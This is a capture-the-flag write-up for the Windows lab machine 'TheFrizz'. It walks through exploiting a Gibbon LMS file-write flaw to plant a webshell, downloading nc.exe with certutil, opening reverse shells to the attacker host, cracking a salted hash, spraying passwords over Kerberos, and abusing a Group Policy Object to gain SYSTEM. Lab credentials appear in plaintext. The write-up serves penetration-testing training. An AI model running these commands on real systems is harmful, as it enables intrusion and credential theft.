
## CTF Writeup: TheFrizz

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oA nmap/TheFrizz 10.129.232.168
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-22 10:35 -0500
Nmap scan report for 10.129.232.168
Host is up (0.022s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-22 22:37:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61217/tcp open  msrpc         Microsoft Windows RPC
61221/tcp open  msrpc         Microsoft Windows RPC
61232/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m54s
| smb2-time: 
|   date: 2026-07-22T22:38:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.59 seconds
```

This nmap scan revealed plenty of information. The FQDN of the target FRIZZDC.frizz.htb, the domain frizz.htb and the hostname of the Domain Controller FRIZZDC. Let's map all of them to the target ip in our local dns file.

```
echo "10.129.232.168 FRIZZDC.frizz.htb frizz.htb FRIZZDC" | tee -a /etc/hosts
```

There seems to be an webserver running on port 80. Let's check it out!

There seems to be an login panel, which seems to be "Gibbon v25.0.0.00" on an Endpoint: /Gibbon-LMS.
Also there is an base64 encoded String, which didn't provide much information. Let's search up for public exploits.

```
searchsploit Gibbon
```

There seems to be an public Exploit for versions below v26.0.00 which provides us with RCE! But we need credentials/be authenticated.

The CMS also provides the information about an user "Ms. Fiona Frizzle".

I googled for public exploits and cve's for the CMS and found out that it's vulnerable to LFI (CVE-2023-34598) & Arbitrary File Write (CVE-2023-45878).

```
git clone https://github.com/Zer0F8th/CVE-2023-34598.git
```

Utilizing this exploit provided an sql dump, but this didn't gave us anything useful! Let's utilize the following exploit for Arbitrary File Write: 

```
git clone https://github.com/PaulDHaes/CVE-2023-45878-POC
```

Utilizing this exploit should give us RCE. Unfortunately it didn't, but it gave us command execution! 

I had to first get into an virtual environment.

```
python3 -m venv myenv
source myenv/bin/activate
```

After that I installed the required python modules.

```
pip3 install requests
```

I then executed the exploit, but didn't gain RCE.

```
python3 CVE-2023-45878.py --reverse-shell -target_url http://FRIZZDC.frizz.htb/Gibbon-LMS -ip 10.129.232.168 -port 443 -srvport 80
```

But upon inspecting the following I gained command execution as user "w.webservice". Let's transfer an netcat.exe to the target system and get RCE.

```
http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=whoami
```

Started up python3 webserver in the directory in which my nc.exe file is stored.

```
python3 -m http.server 80
```

Executed the following command in the webshell.

```
certutil -urlcache -split -f http://10.10.15.9/nc.exe nc.exe
```

Started up listener on port 443 on my local machine.

```
rlwrap nc -lvnp 443
```

Executed the following command in my webshell.

```
nc.exe 10.10.15.9 443 -e cmd
```

Gained RCE as user "w.webservice".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.232.168] 63136
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\Gibbon-LMS>
```

Found Database Credentials in C:\xampp\htdocs\Gibbon-LMS\config.php

```
MrGibbonsDB:MisterGibbs!Parrot!?1
```

I didn't had access to the Users Share, so I utilized the following command to enumerate users on the target system:

```
net user
```

Stored them locally in an users.txt wordlist.

```
a.perlstein
c.sandiego
g.frizzle
J.perlstein
l.awesome
p.terese
v.frizzle
d.hudson
k.franklin
m.ramon
r.tennelli
w.li
c.ramon
f.frizzle
h.arm
M.SchoolBus
t.wright
w.Webservice
Administrator
Guest
krbtgt
```

I tried enumerating a lot of things and found smth. interesting which my previous nmap scan didn't discover! MSSQL Seems to be running!

```
netstat -ano
```

Unfortunately I wasn't able to connect to MySQL from my local machine. Let's perform port forwarding using ligolo-ng.

I transfered my ligolo-ng agent.exe to the target system.

```
certutil -urlcache -split -f http://10.10.15.9/agent.exe agent.exe
```

1. Setting up Ligolo on Kali:

```
sudo ip tuntap add user saitama mode tun ligolo
```

```
sudo ip link set ligolo up
```

2. Start the proxy.

```
ligolo-proxy -selfcert
```

On Target Server

3. Target connect back to local machine.

```
agent.exe -connect 10.10.15.9:11601 -ignore-cert
```

4. Now on the Ligolo CLI on local machine:

```
session
start --tun ligolo
```

5. Then, add the magic Ligolo IP to the IP route table on Kali since we’re trying to access a localhost port.

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

I then remotely connected to the target MySQL Database.

```
mysql -u MrGibbonsDB -p'MisterGibbs!Parrot!?1' -P 3306 --skip-ssl-verify-server-cert -h 240.0.0.1
```

Made the following prompts:

```
show databases;
use gibbons;
show tables;
```

There was a lot of tables, but those seemed to be the interesting ones:

```
gibbonstaff
gibbondepartmentstaff
gibbonperson
```

The last table revealed an encoded password and it's password salt for user "f.frizzle". Which means we can't just bruteforce it. We'll have to find out the hash algorithm in-place and modify our hash, before we can bruteforce it!

```
f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03

/aACFhikmNopqrRTVz2489
```

The "preferencesPasswordProcess.php" in C:\xampp\htdocs\Gibbon-LMS reveals the hash algorithm SHA-256.

```
$passwordStrong = hash('sha256', $salt.$passwordNew);
```

Checking the formats with john the ripper:

```
john --list=format-details --format=all | cut -f 1,7 | grep -i sha256
```

Inspecting all hash formats of sha256, we can see that "dynamic_61" matches the procedure which Gibbon-LMS also uses with the salt being in front and the encoded password string right after!

```
dynamic_61      sha256($s.$p) 256/256 AVX2 8x
```

Target hash, fields are separated by $, fields are dynamic_61:hash:salt

I stored it inside an f.frizz file on my local machine:

```
$dynamic_61$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489

```

Successfully bruteforced an password.

```
john f.frizz --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "hMailServer", but the string is also recognized as "dynamic_61"
Use the "--format=dynamic_61" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (hMailServer [sha256($s.$p) 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Jenni_Luvs_Magic23 (?)     
1g 0:00:00:01 DONE (2026-07-22 12:22) 0.6024g/s 6639Kp/s 6639Kc/s 6639KC/s Jesus14jrj..Jeepers93
Use the "--show --format=hMailServer" options to display all of the cracked passwords reliably
Session completed.
```

```
f.frizzle:Jenni_Luvs_Magic23
```

I stored the password in an passwords.txt in my local machine and tried spraying passwords, but oddly enough it said NTLM Auth is not supported. Remembering the Login CMS Webpage it was stated that only kerberos auth is currently activated! In order to still spray we can utilize the -k parameter in nxc.

```
nxc smb frizzdc.frizz.htb -u users.txt -p passwords.txt --continue-on-success -k
```

No other user reused the password of user f.frizzle & we also have an klock scew error, which we fixed like this:

```
ntpdate -s frizz.htb
```

We now are authenticated as user f.frizzle. But trying to connect via SSH prompts an error. I'm assuming this is related to only Kerberos Authentication being allowed. In order to connect to SSH let's request an TGT for our current user to auth via SSH.

```
impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23
```

We got stored an .ccache file. Let's authenticate with SSH now.

```
KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@frizzdc.frizz.htb
```

Note: If it doesn't work we need to go into /etc/hosts and put the FQDN before the domain & hostname.

Retrieved user.txt in C:\Users\f.frizzle\Desktop.

```
58d9507509eb00c1bcd8d4c37880df34
```

## Privilege Escalation

I checked out all of the directories of user "f.frizzle" and checked out his privileges, but couldn't find anything interesting. I decided to move on with transfering winPEAS to the target system for enumeration.

```
certutil -urlcache -split -f http://10.10.15.9/winPEASx64.exe winPEAS.exe
```

Ran it:

```
./winPEAS.exe
```

Since I couldn't find anything immediatly I will try to check relationships with GPO's in BloodHound.

Downloaded domain information to local machine.

```
bloodhound-python -u f.frizzle -p 'Jenni_Luvs_Magic23' -ns 10.129.232.168 -d frizz.htb -c all
```

Started up bloodhound on local machine.

```
neo4j console
bloodhound
```

No GPO's in place, no ASREP-Roastable or Kerberoastable users. Let's proceed with enumerating the Target manually. Started with the Root-Filesystem.

```
dir -force
```

There is an interesting DumpStack.log.tmp file, which unfortunately I can't access. 

I checked out the recycle bin of user fiona and found two 7z files.

```
C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103
```

Let's download them onto our local machine!

I tried using scp, but it got denied. So I exported the kerberos ticket:

```
export KRB5CCNAME=f.frizzle.ccache
```

Downloaded the 7z file.

```
scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' backup.7z
```

Tried unzipping the file on my local machine, but it didn't work.

```
unzip backup.7z
```

Extracted all files out of the archive!

```
7z x backup.7z
```

I gained an "wapt" directory, in which a lot of documents are stored. Out of intuition I started with enumerating conf directory and found an interesting "waptserver.ini" file.

```
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

The "wapt_password" seems to be encoded in base64, let's decode it!

```
echo "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d
```

Let's add the password to my passwords.txt wordlist and spray users again!

```
nxc smb frizzdc.frizz.htb -u users.txt -p passwords.txt -k --continue-on-success
```

We got new credentials for user M.SchoolBus!

```
M.SchoolBus:!suBcig@MehTed!R
```

In order to connect to the target system as this user I had to request an TGT again. 

```
impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
```

Exported it inside the Kerberos Variable.

```
export KRB5CCNAME=M.SchoolBus.ccache
```

Connected to the Target Domain Controller via Kerberos Auth and SSH.

```
ssh -k frizz.htb/M.SchoolBus@frizz.htb
```

The Current User seems to be part of multiple interesting groups named "Desktop Admins", "Group Policy Creator Owners" and more interestin g groups. Let's mark him as owned in BloodHound and check if we can elevate our privs with him!

He has an unique GPO "WriteGPLink" on two OU's "Domain Controllers" & "Class_Frizz" and since he is part of the Group Policy Creator Owners he is able to read and write Group Policy Objects.

Transfered SharpGPOAbuse.exe onto the target system.

```
curl http://10.10.15.9/SharpGPOAbuse.exe -o SharpGPOAbuse.exe
```

1. Enumerate available GPO.

```
Get-GPO -all
```

2. There is two available GPO's but instead of abusing them, let's just create our own (since we have write permissions).

```
New-GPO -name "hacked"
```

3. Link the GPO to the Computer (DC)

```
New-GPLink -Name "hacked" -target "DC=frizz,DC=htb"
```

4. Use SharpGPOAbuse.exe to execute a command:

```
.\SharpGPOAbuse.exe --addcomputertask --GPOName "hacked" --Author "hacked" --TaskName "RevShell" --Command "powershell.exe" --Arguments "whoami > \users\m.schoolbus\test"
```

This will run whoami and pipe the results into C:\Temp\test. Just after running this, that file doesn’t exist:

The next command will propagate the GPO:

```
gpupdate /force
```

Check if it worked now, yes it did!!

```
type \users\m.schoolbus\test
```

1. It's best if you create another GPO to get an reverse shell.

```
New-GPO -name "Evil GPO"
```

2. Link GPO to Domain Controllers GPO

```
New-GPLink -Name "Evil GPO" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
```

3. Start up listener on local machine:

```
rlwrap nc -lvnp 443
```

4. Abuse SharpHoundGPO.exe to execute command as the target system!

For the payload creation: Navigate to revshells.com -> PowerShell #1 -> Encoding Base64 -> Shell: powershell

```
C:\Users\M.SchoolBus\Desktop\SharpGPOAbuse.exe --AddComputerTask --GPOName "Evil GPO" --Author "Evil GPO" --TaskName "EvilTask" --Command "cmd.exe" --Arguments "/c C:\Temp\nc.exe 10.10.15.9 443 -e cmd.exe" --Force
```

5. The next command will propagate the GPO:

**WARNING**: If it's not working, it's IMPORTANT that SharpGPOAbuse is stored in the directory of the user which has write permissions to GPO's!

```
gpupdate /force
```

Gained RCE as SYSTEM User.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.232.168] 61462
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
9ecbd50f83231f79008cc61c06ad830c
```